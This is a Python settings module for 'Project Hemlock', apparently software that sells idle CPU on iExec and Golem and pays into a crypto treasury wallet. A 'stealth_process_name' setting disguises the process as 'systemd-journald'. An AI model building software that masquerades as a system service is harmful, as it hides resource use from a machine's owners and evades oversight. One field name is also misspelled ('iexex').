"""
Centralized configuration management for Project Hemlock.
All settings are validated and type-checked at runtime.
"""
import os
import sys
from pathlib import Path
from typing import Dict, Any, Optional, List
from dataclasses import dataclass, field
import structlog
from dotenv import load_dotenv

# Initialize structured logging
logger = structlog.get_logger(__name__)

@dataclass
class ResourceSettings:
    """Resource governance configuration with safety limits."""
    max_cpu_percent: float = 70.0
    max_memory_percent: float = 60.0
    max_temperature_c: float = 85.0
    idle_threshold_seconds: int = 300
    stealth_process_name: str = "systemd-journald"
    check_interval_seconds: int = 5
    
    def __post_init__(self):
        """Validate resource settings."""
        if self.max_cpu_percent > 100 or self.max_cpu_percent < 10:
            raise ValueError("MAX_CPU_PERCENT must be between 10 and 100")
        if self.max_temperature_c > 95:
            logger.warning("Max temperature setting may cause hardware damage")

@dataclass
class TreasurySettings:
    """Treasury management and wallet configuration."""
    wallet_address: Optional[str] = None
    wallet_private_key: Optional[str] = None  # Should be encrypted in production
    multisig_threshold: int = 2
    auto_swap_threshold_usd: float = 100.0
    preferred_stablecoin: str = "USDC"
    
    def __post_init__(self):
        """Validate treasury settings."""
        if self.wallet_address and not self.wallet_address.startswith("0x"):
            raise ValueError("Invalid Ethereum wallet address format")
        if self.multisig_threshold < 1:
            raise ValueError("Multisig threshold must be at least 1")

@dataclass
class PlatformSettings:
    """Platform integration configuration."""
    iexec_api_key: Optional[str] = None
    iexex_api_secret: Optional[str] = None
    golem_network: str = "testnet"
    enabled_platforms: List[str] = field(default_factory=lambda: ["iexec"])
    
    def is_platform_enabled(self, platform: str) -> bool:
        """Check if a platform is enabled for task execution."""
        return platform.lower() in [p.lower() for p in self.enabled_platforms]

@dataclass
class MonitoringSettings:
    """Monitoring and alerting configuration."""
    telegram_bot_token: Optional[str] = None
    telegram_chat_id: Optional[str] = None
    log_level: str = "INFO"
    heartbeat_interval_seconds: int = 60
    firebase_collection_prefix: str = "hemlock_"
    
    def can_send_alerts(self) -> bool:
        """Check if alerting is properly configured."""
        return bool(self.telegram_bot_token and self.telegram_chat_id)

@dataclass
class SafetySettings:
    """Safety limits and circuit breakers."""
    daily_loss_limit_usd: float = 5.0
    max_concurrent_tasks: int = 3
    platform_blacklist_timeout_hours: int = 24
    max_retries_per_task: int = 3
    task_timeout_seconds: int = 300
    
    def __post_init__(self):
        """Validate safety settings."""
        if self.daily_loss_limit_usd <= 0:
            raise ValueError("Daily loss limit must be positive")
        if self.max_concurrent_tasks < 1:
            raise ValueError("Must allow at least 1 concurrent task")

class Settings:
    """
    Singleton configuration manager for Project Hemlock.
    Loads from environment variables with validation and defaults.
    """
    _instance = None
    
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
            cls._instance._initialize()
        return cls._instance
    
    def _initialize(self):
        """Initialize settings from environment variables."""
        # Load environment variables
        env_path = Path(__file__).parent.parent / ".env"
        if env_path.exists():
            load_dotenv(env_path)
            logger.info("Loaded environment variables", path=str(env_path))
        else:
            logger.warning("No .env file found, using defaults and system env")
        
        # Initialize component settings
        self.resources = ResourceSettings(
            max_cpu_percent=float(os.getenv("MAX_CPU_PERCENT", 70.0)),
            max_memory_percent=float(os.getenv("MAX_MEMORY_PERCENT", 60.0)),
            max_temperature_c=float(os.getenv("MAX_TEMPERATURE_C", 85.0)),
            idle_threshold_seconds=int(os.getenv("IDLE_THRESHOLD_SECONDS", 300)),
            stealth_process_name=os.getenv("STEALTH_PROCESS_NAME", "systemd-journald")
        )
        
        self.treasury = TreasurySettings(
            wallet_address=os.getenv("TREASURY_WALLET_ADDRESS"),
            wallet_private_key=os.getenv("TREASURY_WALLET_PRIVATE_KEY"),
            multisig_threshold=int(os.getenv("TREASURY_MULTISIG_THRESHOLD", 2)),
            auto_swap_threshold_usd=float(os.getenv("TREASURY_AUTO_SWAP_THRESHOLD", 100.0))
        )
        
        self.platforms = PlatformSettings(
            iexec_api_key=os.getenv("IEXEC_API_KEY"),
            iexex_api_secret=os.getenv("IEXEC_API_SECRET"),
            golem_network=os.getenv("GOLEM_NETWORK", "testnet"),
            enabled_platforms=os.getenv("ENABLED_PLATFORMS", "iexec").split(",")
        )
        
        self.monitoring = MonitoringSettings(
            telegram_bot_token=os.getenv("TELEGRAM_BOT_TOKEN"),
            telegram_chat_id=os.getenv("TELEGRAM_CHAT_ID"),
            log_level=os.getenv("LOG_LEVEL", "INFO"),
            heartbeat_interval_seconds=int(os.getenv("HEARTBEAT_INTERVAL_SECONDS", 60)),
            firebase_collection_prefix=os.getenv("FIREBASE_COLLECTION_PREFIX", "hemlock_")
        )
        
        self.safety = SafetySettings(
            daily_loss_limit_usd=float(os.getenv("DAILY_LOSS_LIMIT_USD", 5.0)),
            max_concurrent_tasks=int(os.getenv("MAX_CONCURRENT_TASKS", 3)),
            platform_blacklist_timeout_hours=int(os.getenv("PLATFORM_BLACKLIST_TIMEOUT_HOURS", 24)),
            max_retries_per_task=int(os.getenv("MAX_RETRIES_PER_TASK", 3)),
            task_timeout_seconds=int(os.getenv("TASK_TIMEOUT_SECONDS", 300))
        )
        
        # Firebase configuration
        self.firebase_project_id = os.getenv("FIREBASE_PROJECT_ID")
        self.firebase_database_url = os.getenv("FIREBASE_DATABASE_URL")
        self.firebase_service_account_path = os.getenv("FIREBASE_SERVICE_ACCOUNT_PATH")
        
        # Validate critical settings
        self._validate_settings()
        logger.info("Settings initialized successfully")
    
    def _validate_settings(self):
        """Validate critical configuration settings."""
        errors = []
        
        # Check Firebase configuration
        if not self.firebase_project_id:
            errors.append("FIREBASE_PROJECT_ID is required")
        
        # Check that at least one platform is configured if enabled
        enabled_platforms = self.platforms.enabled_platforms
        if "iexec" in enabled_platforms and not self.platforms.iexec_api_key:
            errors.append("IEXEC_API_KEY required when iExec platform is enabled")
        
        if errors:
            error_msg = "Configuration errors:\n" + "\n".join(f"  - {e}" for e in errors)
            logger.error("Configuration validation failed", errors=errors)
            raise ValueError(error_msg)
    
    def get_firebase_collection_name(self, collection: str) -> str:
        """Get prefixed collection name for Firebase."""
        return f"{self.monitoring.firebase_collection_prefix}{collection}"

# Global settings instance
settings = Settings()